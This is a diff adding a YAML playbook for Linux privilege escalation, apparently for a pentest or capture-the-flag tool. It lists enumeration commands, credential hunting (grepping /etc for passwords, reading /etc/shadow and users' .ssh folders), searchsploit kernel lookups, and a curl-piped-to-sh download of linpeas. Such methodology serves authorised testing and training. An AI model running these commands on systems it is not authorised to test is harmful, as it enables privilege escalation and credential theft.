@@ -1,0 +1,87 @@
+name: linux-privesc
+display_name: "Linux Privilege Escalation"
+description: "Systematic Linux privesc methodology — from shell to root"
+
+applicable_when:
+  ports: [22, 80]
+  services: ["ssh", "http"]
+
+steps:
+  - id: situational-awareness
+    name: "Situational Awareness"
+    phase: recon
+    description: "Gather basic system information"
+    commands:
+      - "id && whoami && hostname"
+      - "uname -a"
+      - "cat /etc/os-release"
+      - "ip addr"
+
+  - id: sudo-check
+    name: "Sudo Permissions"
+    phase: enumeration
+    description: "Check sudo rights and misconfigurations"
+    commands:
+      - "sudo -l"
+      - "Check GTFOBins for any allowed binaries"
+
+  - id: suid-sgid
+    name: "SUID/SGID Binaries"
+    phase: enumeration
+    description: "Find setuid/setgid binaries that can be abused"
+    commands:
+      - "find / -perm -4000 -type f 2>/dev/null"
+      - "find / -perm -2000 -type f 2>/dev/null"
+
+  - id: cron-jobs
+    name: "Cron Jobs & Timers"
+    phase: enumeration
+    description: "Look for writable cron jobs or systemd timers"
+    commands:
+      - "cat /etc/crontab"
+      - "ls -la /etc/cron.d/"
+      - "systemctl list-timers --all"
+
+  - id: writable-files
+    name: "Writable Files & Directories"
+    phase: enumeration
+    description: "Find world-writable files and directories"
+    commands:
+      - "find / -writable -type f 2>/dev/null | grep -v proc"
+      - "find / -writable -type d 2>/dev/null | grep -v proc"
+
+  - id: credentials
+    name: "Credential Hunting"
+    phase: credential-access
+    description: "Search for passwords, keys, and tokens"
+    commands:
+      - "find / -name '*.bak' -o -name '*.old' -o -name '*.conf' 2>/dev/null | head -20"
+      - "grep -ri 'password' /etc/ 2>/dev/null | head -20"
+      - "ls -la /home/*/.ssh/"
+      - "cat /etc/shadow 2>/dev/null"
+
+  - id: kernel-exploit
+    name: "Kernel / OS Exploits"
+    phase: exploitation
+    description: "Check for known kernel or OS-level vulnerabilities"
+    commands:
+      - "uname -r"
+      - "searchsploit linux kernel $(uname -r | cut -d'-' -f1)"
+
+  - id: automated-enum
+    name: "Run Automated Enumeration"
+    phase: enumeration
+    description: "Use linpeas or similar tools for comprehensive enumeration"
+    commands:
+      - "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+      - "./linpeas.sh -a | tee linpeas_output.txt"
+
+  - id: root-flag
+    name: "Capture Root Flag"
+    phase: post-exploitation
+    description: "Get proof of root access"
+    commands:
+      - "cat /root/proof.txt || cat /root/root.txt"
+      - "id && hostname && ip addr"
+    check:
+      flags: true
